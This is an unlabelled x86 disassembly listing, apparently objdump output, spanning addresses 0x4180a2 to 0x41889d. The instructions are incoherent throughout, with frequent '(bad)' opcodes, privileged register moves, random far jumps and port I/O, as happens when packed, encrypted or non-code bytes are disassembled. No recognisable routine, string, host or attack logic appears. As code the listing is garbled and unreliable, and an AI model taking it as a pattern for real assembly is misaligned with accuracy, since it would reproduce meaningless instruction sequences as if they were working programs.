  4180a2:	cdq    
  4180a3:	or     esp,DWORD PTR [edi-0x6c]
  4180a6:	data16 adc BYTE PTR [eax-0xa],bl
  4180aa:	mov    ch,0x43
  4180ac:	cdq    
  4180ad:	pusha  
  4180ae:	(bad)  
  4180af:	test   eax,0x6f900b09
  4180b4:	les    edi,FWORD PTR [ebx-0x27]
  4180b7:	inc    eax
  4180b8:	stc    
  4180b9:	dec    esi
  4180ba:	ret    0x7f27
  4180bd:	dec    ebp
  4180be:	aam    0x50
  4180c0:	jge    0x4180fe
  4180c2:	outs   dx,BYTE PTR ds:[esi]
  4180c3:	cmp    ecx,ebp
  4180c5:	mov    esi,DWORD PTR [ebx+eiz*4-0x1f0f7578]
  4180cc:	aaa    
  4180cd:	inc    esi
  4180ce:	xor    BYTE PTR [ebx+0x632c09e8],bh
  4180d4:	or     bl,BYTE PTR [ebx+0x1cac04a7]
  4180da:	adc    eax,0x953feb21
  4180df:	sahf   
  4180e0:	or     dh,bh
  4180e2:	sub    BYTE PTR [eax-0x4b],0xf9
  4180e6:	adc    eax,DWORD PTR [eax-0x63]
  4180e9:	mov    dl,0x74
  4180eb:	dec    eax
  4180ec:	sub    bh,BYTE PTR ds:0x389d6b9e
  4180f2:	sbb    bl,al
  4180f4:	jle    0x4180b5
  4180f6:	xor    al,0xcf
  4180f8:	and    ebp,DWORD PTR [eax+0x5a]
  4180fb:	out    dx,al
  4180fc:	mov    ds,WORD PTR es:[edx-0x2f9257b]
  418103:	lods   al,BYTE PTR ds:[esi]
  418104:	(bad)  
  418105:	div    DWORD PTR [ecx]
  418107:	push   0x8893e0de
  41810c:	inc    edx
  41810d:	sbb    DWORD PTR [eax],ebp
  41810f:	aam    0xe0
  418111:	mov    esi,0x38dd760
  418116:	scas   eax,DWORD PTR es:[edi]
  418117:	and    dl,BYTE PTR [esi-0x234fbe91]
  41811d:	test   DWORD PTR [ebx-0x54],esp
  418120:	popa   
  418121:	mov    dl,0xca
  418123:	int    0x91
  418125:	and    ebx,DWORD PTR [esi-0x35]
  418128:	ja     0x418153
  41812a:	cmp    ch,0x39
  41812d:	fst    DWORD PTR [edx+0x8]
  418130:	lds    esi,FWORD PTR [eax+eiz*2+0x54]
  418134:	repnz inc eax
  418136:	xor    esi,DWORD PTR [eax+eax*4-0x62]
  41813a:	pop    es
  41813b:	xor    bx,sp
  41813e:	lods   eax,DWORD PTR ds:[esi]
  41813f:	retf   0xa8a1
  418142:	pushf  
  418143:	adc    al,0xba
  418145:	xor    DWORD PTR [edi-0x456b5780],ebx
  41814b:	or     edi,DWORD PTR [edx-0x2]
  41814e:	xchg   BYTE PTR [ebx-0x4c0ff02e],bl
  418154:	lods   eax,DWORD PTR ds:[esi]
  418155:	mov    ebx,0xeba4aa5b
  41815a:	sahf   
  41815b:	push   cs
  41815c:	dec    ecx
  41815d:	push   esp
  41815e:	fcmovnbe st,st(7)
  418160:	dec    ebx
  418161:	xchg   DWORD PTR [ecx+edx*2-0x42],eax
  418165:	xor    eax,0x9c360ddd
  41816a:	lahf   
  41816b:	sub    ebp,edx
  41816d:	cld    
  41816e:	retf   0x9224
  418171:	sbb    ch,ch
  418173:	sub    ebx,eax
  418175:	xchg   edx,eax
  418177:	push   ds
  418178:	into   
  418179:	jmp    0x48e8f6b0
  41817e:	std    
  41817f:	out    0x48,al
  418181:	fs cmp eax,ebp
  418184:	adc    DWORD PTR [edi-0x3f08b60b],edx
  41818a:	adc    DWORD PTR [edi],0x85f227f3
  418190:	in     al,0x8e
  418192:	bound  esp,QWORD PTR [ebp+0x58c7dfd]
  418198:	mov    ah,0x2e
  41819a:	jne    0x418213
  41819c:	aad    0x1b
  41819e:	xchg   esp,eax
  41819f:	(bad)  
  4181a0:	ins    DWORD PTR es:[edi],dx
  4181a1:	jle    0x418157
  4181a3:	add    BYTE PTR [ebx+0x1b2ef32],0xa1
  4181aa:	mov    dh,0x9c
  4181ac:	mov    al,dh
  4181ae:	in     eax,dx
  4181af:	cmp    BYTE PTR [ebp-0x7a2257df],cl
  4181b5:	pop    ebx
  4181b6:	pop    ds
  4181b7:	add    ebp,DWORD PTR [ecx+0x446d22dd]
  4181bd:	(bad)  
  4181be:	xor    al,0xff
  4181c0:	clc    
  4181c1:	sbb    eax,0xcf7c0355
  4181c6:	call   0x449b9e2
  4181cb:	imul   esi,DWORD PTR [ebx-0x17],0x1c
  4181cf:	cmp    al,BYTE PTR [edi+eiz*2]
  4181d2:	js     0x418225
  4181d4:	sbb    eax,0x5f8d2637
  4181d9:	fld    DWORD PTR [ecx-0x3ce0d52]
  4181df:	call   esi
  4181e1:	enter  0x77f2,0x96
  4181e5:	mov    gs,ebx
  4181e7:	and    DWORD PTR [edi-0x611f2185],ebp
  4181ed:	add    eax,0x2c1b996d
  4181f2:	add    BYTE PTR [esi+0x1a9b8951],dl
  4181f8:	sbb    BYTE PTR [edx+0x29c823fe],al
  4181fe:	aad    0x83
  418200:	loope  0x4181e8
  418202:	fs movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  418205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418206:	push   0x23f31a41
  41820b:	rcl    DWORD PTR [ebp-0x7f6a862],1
  418211:	mov    DWORD PTR [ecx-0x3d],edi
  418214:	in     eax,dx
  418215:	cmp    al,0x7e
  418217:	push   ds
  418218:	ins    BYTE PTR es:[edi],dx
  418219:	dec    edi
  41821a:	outs   dx,DWORD PTR ds:[esi]
  41821b:	adc    eax,0xb62deef
  418220:	leave  
  418221:	(bad)  
  418222:	ror    eax,cl
  418224:	fist   WORD PTR ds:0x13ad489c
  41822a:	push   ecx
  41822b:	js     0x41826d
  41822d:	cmc    
  41822e:	sub    bl,bl
  418230:	pop    ds
  418231:	add    DWORD PTR [esi-0x59fefbe5],esp
  418237:	jbe    0x418238
  418239:	xor    edi,eax
  41823b:	mov    edx,0x55b76cff
  418240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418241:	stos   DWORD PTR es:[edi],eax
  418242:	jo     0x418290
  418244:	pushf  
  418245:	jnp    0x418298
  418247:	(bad)
  41824a:	xor    dh,0xc2
  41824d:	jno    0x418232
  41824f:	xchg   ecx,edx
  418251:	jo     0x418229
  418253:	lock enter 0x8506,0xa5
  418258:	lock pusha 
  41825a:	sub    eax,0xc22e8551
  41825f:	mov    ecx,0xcfd1762e
  418264:	jmp    0x4e62:0xfc744a0e
  41826b:	mov    edi,0x6089451e
  418270:	loopne 0x41824a
  418272:	aaa    
  418273:	adc    ebp,DWORD PTR [ebx]
  418275:	pusha  
  418276:	pop    esi
  418277:	push   ecx
  418278:	popf   
  418279:	jbe    0x418238
  41827b:	pop    eax
  41827c:	sar    edx,1
  41827e:	jmp    0xcac8:0xc301f80b
  418285:	(bad)  
  418286:	es add al,0xbe
  418289:	or     BYTE PTR es:[ebp+0x57],bh
  41828d:	add    cl,BYTE PTR [esi+0x50]
  418290:	mov    dh,0x47
  418292:	sub    dl,BYTE PTR [ecx-0x3e]
  418295:	arpl   WORD PTR [edx+0x33aaee24],dx
  41829b:	sar    DWORD PTR [ecx+edx*8],1
  41829e:	pop    eax
  41829f:	fidivr DWORD PTR [edx-0x6e747e31]
  4182a5:	sbb    al,BYTE PTR [ebx-0x7c05db27]
  4182ab:	sbb    al,0x71
  4182ad:	imul   BYTE PTR [esi-0x36]
  4182b0:	mov    dl,ch
  4182b2:	and    al,0xeb
  4182b4:	fisubr DWORD PTR [edx+0x31]
  4182b7:	jmp    0x1143:0x5b266f1
  4182be:	test   al,0x90
  4182c0:	shl    eax,cl
  4182c2:	inc    edi
  4182c3:	pushf  
  4182c4:	inc    esi
  4182c5:	inc    eax
  4182c6:	lahf   
  4182c7:	les    eax,FWORD PTR [ebx-0x982bc96]
  4182cd:	aas    
  4182ce:	lahf   
  4182cf:	or     al,0xc7
  4182d1:	cmp    ecx,DWORD PTR [ecx-0x16960d03]
  4182d7:	es xor ah,bl
  4182da:	out    0xd4,al
  4182dc:	test   al,0xf0
  4182de:	add    ecx,0xffffffa3
  4182e1:	xchg   ebx,eax
  4182e2:	gs inc edx
  4182e4:	(bad)  
  4182e5:	addr16 dec eax
  4182e7:	or     ch,BYTE PTR [ebx+edx*4+0x18]
  4182eb:	mov    ebx,0xdd791284
  4182f0:	mov    al,ds:0x39d7a68a
  4182f5:	mov    ch,0xf4
  4182f7:	pusha  
  4182f8:	js     0x4182fe
  4182fa:	outs   dx,BYTE PTR ds:[esi]
  4182fb:	mov    edx,0xbafa97c3
  418300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418301:	in     al,dx
  418302:	lock scas al,BYTE PTR es:[edi]
  418304:	dec    ecx
  418305:	stc    
  418306:	cmp    BYTE PTR [esi],bh
  418308:	fisttp WORD PTR [ecx+0x67]
  41830b:	adc    eax,eax
  41830d:	mov    ebx,0x40fb9d9d
  418312:	(bad)  
  418313:	sub    edi,DWORD PTR [eax]
  418315:	push   eax
  418316:	repnz fdivr QWORD PTR [esi+0x52]
  41831a:	scas   al,BYTE PTR es:[edi]
  41831b:	int    0xda
  41831d:	ja     0x418366
  41831f:	js     0x418343
  418321:	adc    ch,BYTE PTR [edi-0x5b]
  418324:	inc    ebp
  418325:	leave  
  418326:	and    ecx,esi
  418328:	test   BYTE PTR [edi-0x58f28a89],cl
  41832e:	mov    al,0x3a
  418330:	mov    dl,0xb2
  418332:	jnp    0x418326
  418334:	jle    0x41832b
  418336:	ins    DWORD PTR es:[edi],dx
  418337:	(bad)  
  418339:	(bad)  
  41833a:	adc    esp,DWORD PTR [edi]
  41833c:	mov    dl,0x2d
  41833e:	ret    
  41833f:	mov    ecx,0x15fb7cfc
  418344:	sub    BYTE PTR [si],ah
  418347:	mov    dh,0x3b
  418349:	in     eax,0x63
  41834b:	mov    BYTE PTR [ecx],ch
  41834d:	sbb    DWORD PTR [edx+0x2d951b03],0x5b
  418354:	mov    bl,0xae
  418356:	ret    0xb16d
  418359:	out    dx,eax
  41835a:	hlt    
  41835b:	jle    0x4182e3
  41835d:	push   0x5a
  41835f:	lods   al,BYTE PTR ds:[esi]
  418360:	sti    
  418361:	xor    eax,0xa6a3323
  418366:	add    eax,0x3706f29e
  41836b:	xchg   ebx,eax
  41836c:	mov    dh,0x38
  41836e:	xchg   esi,eax
  41836f:	fsub   st(0),st
  418371:	push   edi
  418372:	inc    esp
  418373:	fld    QWORD PTR [ebp+0x16]
  418376:	sub    edx,DWORD PTR [ebx]
  418378:	retf   0xfcd
  41837b:	inc    ecx
  41837c:	mov    DWORD PTR [edi-0x2a],esp
  41837f:	jns    0x4183a8
  418381:	popf   
  418382:	push   eax
  418383:	stos   BYTE PTR es:[edi],al
  418384:	je     0x41834b
  418386:	or     ebx,DWORD PTR [ecx+0xad1ebbd]
  41838c:	ficom  WORD PTR [ebp+0x1f95682a]
  418392:	out    0xe9,al
  418394:	adc    eax,0x326a14b8
  418399:	push   ds
  41839a:	and    BYTE PTR [eax],ah
  41839c:	pop    eax
  41839d:	daa    
  41839e:	vprotw ymm3,xmm1,[edi]
  4183a3:	jg     0x418404
  4183a5:	ror    edx,cl
  4183a7:	mov    eax,ds:0x56b7eac5
  4183ac:	fadd   DWORD PTR [edi-0x67]
  4183af:	(bad)  
  4183b0:	fcomp  QWORD PTR [ebp-0x327bba09]
  4183b6:	test   BYTE PTR [ebx+0x2c311897],bl
  4183bc:	push   ebp
  4183bd:	mov    dh,0xf1
  4183bf:	pop    esi
  4183c0:	cmp    esi,DWORD PTR [ebp-0x1c]
  4183c3:	add    eax,0x5e9b47db
  4183c8:	imul   esp,DWORD PTR [eax-0x65f132d5],0x39a7312b
  4183d2:	dec    ebp
  4183d3:	std    
  4183d4:	inc    esp
  4183d5:	xchg   ecx,eax
  4183d6:	jle    0x4183c6
  4183d8:	pop    ecx
  4183d9:	add    BYTE PTR [eax],al
  4183db:	sbb    esi,ebp
  4183dd:	mov    dh,0x6b
  4183df:	lds    eax,FWORD PTR [esi+ebx*2+0x5c3ab8a9]
  4183e6:	loopne 0x418369
  4183e8:	mov    dh,BYTE PTR [eax]
  4183ea:	stos   BYTE PTR es:[edi],al
  4183eb:	shl    DWORD PTR [edi-0x3c],cl
  4183ee:	pop    ebx
  4183ef:	pop    ebx
  4183f0:	fstp   DWORD PTR [ebx+0x26]
  4183f3:	xor    DWORD PTR [edx],ebp
  4183f5:	jge    0x41838a
  4183f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183f8:	dec    ebp
  4183f9:	ins    DWORD PTR es:[edi],dx
  4183fa:	(bad)  
  4183fb:	mov    ds:0xbe1684af,eax
  418400:	aaa    
  418401:	mov    esp,0x2602d48c
  418406:	rol    edx,0xc6
  418409:	retf   
  41840a:	mov    ah,0x89
  41840c:	jmp    0x418435
  41840e:	mov    eax,0xacbe0f05
  418413:	js     0x41844a
  418415:	sbb    eax,DWORD PTR [eax]
  418417:	je     0x41842f
  418419:	in     al,dx
  41841a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41841b:	(bad)  
  41841c:	mov    bl,0xed
  41841e:	sub    edx,edx
  418420:	mov    edx,DWORD PTR [eax+eax*4+0xc]
  418424:	push   0x77
  418426:	setb   BYTE PTR [ebp-0x578acb41]
  41842d:	aad    0x74
  41842f:	and    eax,0xd1e78e39
  418434:	inc    ebx
  418435:	cmp    BYTE PTR [ebx+0x5a90da42],0xe2
  41843c:	sbb    dl,ch
  41843e:	dec    esi
  41843f:	pop    ds
  418440:	jge    0x418424
  418442:	jnp    0x418498
  418444:	rcl    DWORD PTR [edx+ebp*8+0x50],1
  418448:	test   al,0xe
  41844a:	stc    
  41844b:	rcr    BYTE PTR [ecx+0x38],1
  41844e:	pop    esi
  41844f:	or     al,0xea
  418451:	cmp    al,0x46
  418453:	into   
  418454:	cmp    ah,ah
  418456:	pop    ebx
  418457:	mov    ds:0x1286ec91,al
  41845c:	and    esi,ebp
  41845e:	js     0x418411
  418460:	adc    dl,BYTE PTR [ebx]
  418462:	inc    ebp
  418463:	sbb    BYTE PTR [eax+0x1b171208],ah
  418469:	es addr16 cmp cl,ch
  41846d:	dec    edi
  41846e:	add    BYTE PTR [eax+ebx*2-0x6660b704],cl
  418475:	mov    al,ds:0xfdef5587
  41847a:	xor    DWORD PTR [esi+0x7c],edi
  41847d:	inc    edx
  41847e:	(bad)  
  41847f:	ja     0x418489
  418481:	bound  edx,QWORD PTR [edi+0x72ba2de6]
  418487:	jno    0x4184e6
  418489:	jno    0x41846d
  41848b:	inc    esp
  41848c:	mov    ah,0xd2
  41848e:	jmp    0x347:0x3ea47857
  418495:	es mov bl,0xfe
  418498:	icebp  
  418499:	cli    
  41849a:	adc    ah,ch
  41849c:	stos   BYTE PTR es:[edi],al
  41849d:	pushf  
  41849e:	shl    esi,cl
  4184a0:	mov    ecx,0x51f5cbde
  4184a5:	or     al,0x60
  4184a7:	lds    ecx,FWORD PTR [ecx]
  4184a9:	mov    ecx,0xac9065c6
  4184ae:	push   ss
  4184af:	xchg   DWORD PTR [eax],edx
  4184b1:	sbb    edx,ebx
  4184b3:	fadd   DWORD PTR [edi+0x72]
  4184b6:	inc    ebp
  4184b7:	xchg   ecx,eax
  4184b8:	add    eax,0x157a0d04
  4184bd:	cld    
  4184be:	jl     0x4184c8
  4184c0:	mov    DWORD PTR [edi+ecx*8-0x4b8b84bd],ecx
  4184c7:	mov    ss,eax
  4184c9:	jmp    DWORD PTR [ecx-0x54]
  4184cc:	xor    dh,BYTE PTR [ebx]
  4184ce:	mov    ch,0x5c
  4184d0:	jle    0x4184d2
  4184d2:	mov    eax,0x7d051a9f
  4184d7:	mov    ebx,0xbaf091e6
  4184dc:	shr    BYTE PTR [ebx],0xe2
  4184df:	lea    edx,[ebx+edx*8-0x23]
  4184e3:	jecxz  0x418532
  4184e5:	addr16 cdq 
  4184e7:	or     al,0x87
  4184e9:	aad    0x57
  4184eb:	fscale 
  4184ed:	out    dx,al
  4184ee:	and    ebp,edi
  4184f0:	fld    DWORD PTR [ebp+0x46]
  4184f3:	inc    ebx
  4184f4:	and    esp,0x5
  4184f7:	cld    
  4184f8:	mov    BYTE PTR [ecx+0x1ef7444f],0x80
  4184ff:	cwde   
  418500:	jo     0x4184c2
  418502:	mov    ah,0xbc
  418504:	repnz enter 0x1b66,0x63
  418509:	fimul  DWORD PTR [eax+0x6a53c556]
  41850f:	xchg   ecx,eax
  418510:	data16 add BYTE PTR [ebx+0x5282eb00],dl
  418517:	inc    ebp
  418518:	inc    eax
  418519:	fwait
  41851a:	mov    dh,bh
  41851c:	sbb    al,0x2d
  41851e:	data16 jge 0x418563
  418521:	pusha  
  418522:	inc    ebx
  418523:	xor    BYTE PTR [ecx+edx*2+0x6b],dl
  418527:	push   ebp
  418528:	push   es
  418529:	popf   
  41852a:	mov    ch,0x62
  41852c:	cwde   
  41852d:	mov    ds:0x765449a0,al
  418532:	test   cl,bl
  418534:	enter  0x3247,0xc5
  418538:	lods   al,BYTE PTR ds:[esi]
  418539:	ret    
  41853a:	(bad)  
  41853b:	mov    edx,0xfa3212b3
  418540:	pop    ss
  418541:	push   ss
  418542:	(bad)  
  418543:	js     0x4184df
  418545:	pop    esi
  418546:	cmp    BYTE PTR [esi-0x530ebe60],0xe9
  41854d:	mov    ds:0xb6ed6c98,al
  418552:	mov    al,ds:0x2298c44f
  418557:	aas    
  418558:	ror    BYTE PTR [ebx-0x40e09ed],1
  41855e:	fldenv [ecx+0x36]
  418561:	add    eax,0x998c0072
  418566:	adc    BYTE PTR [esi+0x3d],bl
  418569:	out    0xc,al
  41856b:	push   eax
  41856c:	fwait
  41856d:	call   ebp
  41856f:	daa    
  418570:	push   0x62
  418572:	sti    
  418573:	(bad)  [esi+0x7d29d746]
  418579:	lahf   
  41857a:	addr16 loope 0x418507
  41857d:	push   ebx
  41857e:	add    BYTE PTR [edi-0x74],0xc5
  418582:	les    edx,FWORD PTR [edi+ecx*1+0x11817f7d]
  418589:	test   BYTE PTR [esp+ebp*2+0xc],bl
  41858d:	ret    0x9e28
  418590:	sub    ebx,edi
  418592:	pop    ss
  418593:	inc    esi
  418594:	or     esp,eax
  418596:	mov    dl,0x73
  418598:	mov    al,ds:0x1003d4c8
  41859d:	mov    ch,BYTE PTR [esi]
  41859f:	dec    edx
  4185a0:	and    bl,cl
  4185a2:	and    BYTE PTR [ecx+0x4a718e6b],0x37
  4185a9:	loope  0x41859d
  4185ab:	cmp    esi,ecx
  4185ad:	inc    ebp
  4185ae:	jne    0x4185b1
  4185b0:	inc    ebx
  4185b1:	sbb    BYTE PTR [edi-0x68f45cca],bh
  4185b7:	fs pop es
  4185b9:	addr16 pop edi
  4185bb:	out    0xf1,al
  4185bd:	push   ss
  4185be:	pop    esi
  4185bf:	fisttp DWORD PTR [edi]
  4185c1:	cmc    
  4185c2:	rol    ebp,0x69
  4185c5:	jle    0x418564
  4185c7:	fdivr  QWORD PTR ds:0x552aad3d
  4185cd:	cmp    DWORD PTR [edx],edx
  4185cf:	sbb    BYTE PTR [ebx-0x41],al
  4185d2:	repz cmp esp,DWORD PTR [eax]
  4185d5:	pusha  
  4185d6:	pop    ss
  4185d7:	ror    DWORD PTR [edx],cl
  4185d9:	push   esp
  4185da:	rcl    DWORD PTR [edi-0x37],0xf4
  4185de:	out    dx,eax
  4185df:	xchg   BYTE PTR [esi-0x4fe375f1],ch
  4185e5:	fist   WORD PTR [edi-0x2bfac70e]
  4185eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185ec:	in     al,dx
  4185ed:	pop    ecx
  4185ee:	push   ds
  4185ef:	dec    esi
  4185f0:	adc    esi,DWORD PTR [edi+0x76]
  4185f3:	jg     0x418652
  4185f5:	xor    ah,dl
  4185f7:	adc    eax,0x6edeb4c9
  4185fc:	mov    eax,0xe628e3dd
  418601:	loope  0x41859e
  418603:	xor    BYTE PTR [ebx-0x1eda9bb2],bl
  418609:	xadd   bh,dh
  41860c:	mov    ds:0x7518e49,al
  418611:	outs   dx,DWORD PTR ds:[esi]
  418612:	mov    bh,0x15
  418614:	adc    al,0x5f
  418616:	cmp    eax,0xdfe90b4
  41861b:	mov    al,0x6
  41861d:	fdivr  QWORD PTR [ebx-0x17941e31]
  418623:	fiadd  DWORD PTR [eax]
  418625:	xor    eax,0x5ef9ee88
  41862a:	xor    ebp,edx
  41862c:	jge    0x418656
  41862e:	pop    ecx
  41862f:	pop    eax
  418630:	pop    es
  418631:	mov    esi,0x7bf38ba5
  418636:	jge    0x41860f
  418638:	push   esi
  418639:	stos   BYTE PTR es:[edi],al
  41863a:	jmp    FWORD PTR [ebp-0x7c]
  41863d:	shr    BYTE PTR [esi],1
  41863f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418640:	fcom   QWORD PTR [ecx+0x15]
  418643:	lods   eax,DWORD PTR ds:[esi]
  418644:	out    dx,al
  418645:	jo     0x4185e1
  418647:	mov    eax,0x7e80a692
  41864c:	xor    DWORD PTR [ebx],esp
  41864e:	sbb    eax,0x76b9d71d
  418653:	cli    
  418654:	mov    dl,0xd3
  418656:	and    ebx,0xffffffa0
  418659:	out    dx,eax
  41865a:	sbb    eax,0x55144ef2
  41865f:	mov    ecx,0x243532b4
  418664:	jo     0x41866f
  418666:	sub    BYTE PTR [ebx+0x18344b87],ch
  41866c:	ins    DWORD PTR es:[edi],dx
  41866d:	imul   ebx,DWORD PTR [esi+0x40e0fb62],0xffffffeb
  418674:	loop   0x4186e0
  418676:	mov    ch,dl
  418678:	mov    ds:0xb0651a05,eax
  41867d:	dec    esp
  41867e:	retf   
  41867f:	ficom  WORD PTR [ebx-0x35]
  418682:	popf   
  418683:	sar    BYTE PTR [edx],0x5f
  418686:	inc    esi
  418687:	sar    BYTE PTR [eax-0x5a],0xf
  41868b:	fs push ecx
  41868d:	out    0x2f,eax
  41868f:	enter  0x544f,0xf0
  418693:	xor    DWORD PTR [edi+ecx*4+0x7f5cec32],ecx
  41869a:	sub    BYTE PTR [edi-0x4e],dh
  41869d:	loop   0x4186bb
  41869f:	imul   ecx,DWORD PTR [edx],0x9af304bb
  4186a5:	mov    eax,ds:0xba83b676
  4186aa:	sahf   
  4186ab:	inc    esi
  4186ac:	push   edi
  4186ad:	std    
  4186ae:	neg    DWORD PTR [ebx+0x88cfb47]
  4186b4:	(bad)  
  4186b5:	icebp  
  4186b6:	adc    eax,0xe9d557ee
  4186bb:	and    BYTE PTR [ebp+0x29d4ef70],0x5b
  4186c2:	sahf   
  4186c3:	and    al,0x2e
  4186c5:	mov    ebx,0x2a7b1fe9
  4186ca:	jecxz  0x418724
  4186cc:	mov    dl,0xf6
  4186ce:	ret    0x21dd
  4186d1:	mov    cl,0xbe
  4186d3:	test   DWORD PTR [edi],edx
  4186d5:	cmp    DWORD PTR [ecx-0x765b9ced],edx
  4186db:	gs jge 0x4186da
  4186de:	test   BYTE PTR [edi-0x39],0xac
  4186e2:	cmp    al,0xbb
  4186e4:	sub    BYTE PTR [ebx+0x33],0xc3
  4186e8:	inc    esi
  4186e9:	sbb    DWORD PTR [edi+eax*1],esp
  4186ec:	xchg   cl,bl
  4186ee:	lods   eax,DWORD PTR ds:[esi]
  4186ef:	stos   BYTE PTR es:[edi],al
  4186f0:	imul   ebx,DWORD PTR [esi+0x7b],0x72
  4186f4:	sub    eax,0x66f201ac
  4186f9:	je     0x41873a
  4186fb:	mov    ds:0x7002767c,al
  418700:	mov    esi,0xb99cedf2
  418705:	(bad)  
  418706:	xor    DWORD PTR [esi+0x6b],ebx
  418709:	icebp  
  41870a:	jmp    0x9b2a:0xb26590d3
  418711:	mov    dh,0x90
  418713:	cld    
  418714:	pop    edi
  418715:	(bad)  
  418717:	or     eax,0x7c5d9ead
  41871c:	adc    BYTE PTR [eax],al
  41871e:	or     al,0x3f
  418720:	es (bad) 
  418722:	push   edx
  418723:	jge    0x418735
  418725:	fsubp  st(5),st
  418727:	xchg   edx,eax
  418728:	sbb    eax,0x263f5a85
  41872d:	inc    edx
  41872e:	mov    al,BYTE PTR [eax-0x73]
  418731:	mov    eax,0x8c52e9f9
  418736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418737:	push   ds
  418738:	(bad)  
  418739:	xor    DWORD PTR [eax-0x7a],ebp
  41873c:	gs adc al,0x3
  41873f:	push   ds
  418740:	sbb    al,0x65
  418742:	(bad)  
  418743:	(bad)  
  418744:	jecxz  0x418767
  418746:	jo     0x4186fb
  418748:	fstp   DWORD PTR [ebp-0x798c5295]
  41874e:	cs pusha 
  418750:	pop    edx
  418751:	cs aas 
  418753:	cmp    BYTE PTR [edi+0x1e],dh
  418756:	(bad)  
  418757:	add    al,0x9b
  418759:	pushf  
  41875a:	mov    esi,0xb8315794
  41875f:	and    BYTE PTR [esi],ah
  418761:	scas   al,BYTE PTR es:[edi]
  418762:	ficomp DWORD PTR [ebx-0x136d8ad0]
  418768:	xchg   edi,eax
  418769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41876a:	int3   
  41876b:	lahf   
  41876c:	push   edi
  41876d:	mov    ch,0x91
  41876f:	mov    BYTE PTR [ebp-0x35],dl
  418772:	jbe    0x418714
  418774:	shl    DWORD PTR [edx+ebx*1+0x1e],1
  418778:	loopne 0x4187ef
  41877a:	gs aas 
  41877c:	int3   
  41877d:	jno    0x418788
  41877f:	in     eax,0x1
  418781:	mov    eax,ds:0x65446014
  418786:	or     bl,BYTE PTR [ebp+0x72405c91]
  41878c:	mov    eax,0x8fa2de29
  418791:	scas   eax,DWORD PTR es:[edi]
  418792:	mov    ch,0x12
  418794:	gs sbb eax,0x36477b86
  41879a:	add    bh,BYTE PTR [ebx-0x6b]
  41879d:	stos   DWORD PTR es:[edi],eax
  41879e:	cmp    bl,BYTE PTR [ebp+0x5196ea5]
  4187a4:	xlat   BYTE PTR ds:[ebx]
  4187a5:	ins    BYTE PTR es:[edi],dx
  4187a6:	std    
  4187a7:	lock mov al,0xb2
  4187aa:	cs aaa 
  4187ac:	outs   dx,DWORD PTR ds:[esi]
  4187ad:	outs   dx,BYTE PTR ds:[esi]
  4187ae:	aam    0xb6
  4187b0:	sar    BYTE PTR ds:0x6642b137,cl
  4187b6:	pop    es
  4187b7:	(bad)  
  4187b8:	shr    BYTE PTR [edi],cl
  4187ba:	mov    al,0x30
  4187bc:	rcl    BYTE PTR [ecx],0x16
  4187bf:	repz pop ebp
  4187c1:	xchg   esi,eax
  4187c2:	inc    edi
  4187c3:	call   0xb35:0xf15a60fa
  4187ca:	cld    
  4187cb:	nop
  4187cc:	mov    ch,0x60
  4187ce:	adc    DWORD PTR [eax-0x23d0a08],0xffffffdd
  4187d5:	rol    DWORD PTR [eax],0x2d
  4187d8:	dec    esi
  4187d9:	retf   0xf88
  4187dc:	clc    
  4187dd:	jbe    0x4187e1
  4187df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187e1:	pop    esp
  4187e2:	sar    BYTE PTR [esi+edi*4],cl
  4187e5:	ret    
  4187e6:	and    BYTE PTR [esp+ecx*8],cl
  4187e9:	fisub  DWORD PTR [edx-0x2b]
  4187ec:	add    al,0xb5
  4187ee:	popf   
  4187ef:	pop    ebp
  4187f0:	push   edi
  4187f1:	mov    dl,BYTE PTR [ebp+0x702b462d]
  4187f7:	xchg   DWORD PTR [ebx-0x472ee468],edi
  4187fd:	(bad)  
  4187fe:	jge    0x41882a
  418800:	inc    edi
  418801:	fs push esi
  418803:	mov    dh,BYTE PTR [edi-0x49deaec3]
  418809:	mov    eax,ds:0x7ab62faf
  41880e:	push   cs
  41880f:	enter  0x5ee,0xab
  418813:	jmp    0xa2af06e0
  418818:	imul   esi,DWORD PTR [edx-0x3],0xffffffff
  41881c:	dec    ebx
  41881d:	mov    ebp,0x3bcb1459
  418822:	fwait
  418823:	mov    edi,0xd369fe07
  418828:	in     eax,0x4
  41882a:	jb     0x41880d
  41882c:	inc    edx
  41882d:	ret    0xa3f3
  418830:	out    0x2a,al
  418832:	shl    DWORD PTR [ebx],cl
  418834:	fild   WORD PTR [edx-0x14]
  418837:	push   edi
  418838:	ret    0x666c
  41883b:	out    0xc1,al
  41883d:	and    al,0x66
  41883f:	pop    ds
  418840:	and    eax,0xc0e6d55d
  418845:	and    ebx,esp
  418847:	clc    
  418848:	shr    ch,1
  41884a:	and    eax,0x5bad37d7
  41884f:	dec    eax
  418850:	inc    esi
  418851:	cdq    
  418852:	lock xchg ecx,eax
  418854:	mov    ah,0x79
  418856:	xchg   BYTE PTR [esi-0x60611b14],dl
  41885c:	cs pop esi
  41885e:	data16 adc bl,BYTE PTR [esi]
  418861:	cmp    eax,0x40c7d88a
  418866:	lods   al,BYTE PTR ds:[esi]
  418867:	lods   al,BYTE PTR ds:[esi]
  418868:	into   
  418869:	sbb    bh,BYTE PTR [edi-0x4b06a6c1]
  41886f:	cmp    DWORD PTR [ebp+0x39],edx
  418872:	cmp    edi,DWORD PTR [ebx+0x75]
  418875:	mov    bl,0xe7
  418877:	inc    eax
  418878:	cs xchg esp,eax
  41887a:	or     dh,cl
  41887c:	push   es
  41887d:	ins    DWORD PTR es:[edi],dx
  41887e:	ins    DWORD PTR es:[edi],dx
  41887f:	or     BYTE PTR [ecx+0x119032c5],al
  418885:	bound  edi,QWORD PTR [ecx-0x3]
  418888:	(bad)  
  418889:	nop
  41888a:	mov    tr3,ecx
  41888d:	push   eax
  41888e:	cmp    eax,0x416b78ce
  418893:	int    0x59
  418895:	jb     0x4188f9
  418897:	jg     0x41887e
  418899:	cmp    edi,DWORD PTR [esi]
  41889b:	fidivr WORD PTR [esi]
  41889d:	leave  
